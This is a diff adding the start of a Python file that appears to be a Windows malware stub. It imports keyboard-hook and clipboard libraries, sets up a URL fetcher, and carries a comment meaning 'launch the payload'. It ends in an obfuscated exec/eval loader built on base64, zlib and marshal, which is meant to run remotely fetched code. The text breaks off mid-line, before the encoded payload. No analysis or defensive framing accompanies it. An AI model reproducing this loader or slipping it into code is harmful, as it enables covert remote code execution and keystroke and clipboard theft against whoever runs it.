@@ -1,0 +1,10 @@
+# -*- coding: utf-8 -*-
+import sys,zlib,base64,marshal,json,urllib,pythoncom,pyHook,win32clipboard,win32com,uuid
+from win32com.makegw.makegwparse import *
+from ctypes import *
+if sys.version_info[0] > 2:
+    from urllib import request
+urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
+## Lance le payload
+##.format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format  ## (url),2)))))
+exec(eval(marshal.loads(zlib.decompress(base64.b64decode(
